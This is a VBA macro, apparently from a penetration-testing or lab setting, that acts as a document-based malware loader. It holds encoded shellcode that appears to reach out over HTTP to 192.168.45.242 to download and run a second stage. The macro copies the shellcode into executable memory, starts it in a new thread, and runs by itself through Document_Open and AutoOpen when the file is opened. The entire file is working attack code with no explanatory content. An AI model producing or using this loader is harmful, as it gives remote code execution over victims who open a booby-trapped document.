#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, ByVal dwCreationFlags As Long, lpThreadId As LongPtr) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As LongPtr) As LongPtr
#Else
    Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long
#End If

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,86,72,15,183,74,74,72,139,114,80,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24, _
11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,80,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,77,49,201,72,1,214,72,49,192,65,193,201,13,172,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7, _
255,213,83,83,232,84,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,77,97,99,105,110,116,111,115,104,59,32,73,110,116,101,108,32,77,97,99,32,79,83,32,88,32,49,52,46,55,59,32,114,118,58,49,51,51,46,48,41,32,71,101,99,107,111,47,50,48,49,48,48,49,48,49,32,70, _
105,114,101,102,111,120,47,49,51,51,46,48,0,89,83,90,77,49,192,77,49,201,83,83,73,186,58,86,121,167,0,0,0,0,255,213,232,15,0,0,0,49,57,50,46,49,54,56,46,52,53,46,50,52,50,0,90,72,137,193,73,199,192,187,1,0,0,77,49,201,83,83,106,3,83,73,186,87,137,159, _
198,0,0,0,0,255,213,232,179,0,0,0,47,98,104,101,50,49,103,113,52,115,48,107,48,97,106,86,111,88,98,121,77,68,65,106,119,117,73,78,50,78,81,90,69,101,81,110,85,75,98,100,84,69,108,110,84,48,117,116,103,50,120,74,103,67,101,105,107,50,109,82,101,75,75,75,72,76,117,90, _
104,72,99,70,112,115,76,102,105,75,48,107,70,80,99,88,69,76,97,102,112,120,73,90,103,107,117,104,68,117,108,121,76,102,79,81,104,53,82,88,88,55,104,82,89,78,45,83,56,108,55,72,100,49,87,107,81,86,51,69,97,105,104,88,74,88,86,86,69,75,97,103,78,73,111,118,117,109,55,97, _
83,107,81,106,50,69,54,86,78,77,65,103,109,118,72,116,116,69,57,100,98,70,53,89,50,110,117,56,57,86,0,72,137,193,83,90,65,88,77,49,201,83,72,184,0,50,168,132,0,0,0,0,80,83,83,73,199,194,235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31,90,82,104,128,51, _
0,0,73,137,224,106,4,65,89,73,186,117,70,158,134,0,0,0,0,255,213,77,49,192,83,90,72,137,241,77,49,201,77,49,201,83,83,73,199,194,45,6,24,123,255,213,133,192,117,31,72,199,193,136,19,0,0,73,186,68,240,53,224,0,0,0,0,255,213,72,255,207,116,2,235,170,232,85,0,0, _
0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16,0,0,73,186,88,164,83,229,0,0,0,0,255,213,72,147,83,83,72,137,231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18,150,137,226,0,0,0,0,255,213,72,131,196,32,133,192,116,178,102,139,7,72,1,195, _
133,192,117,210,88,195,88,106,0,89,73,199,194,240,181,162,86,255,213)

    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    If addr = 0 Then Exit Function ' Falha na alocação

    For counter = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + counter, CByte(buf(counter)), 1
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
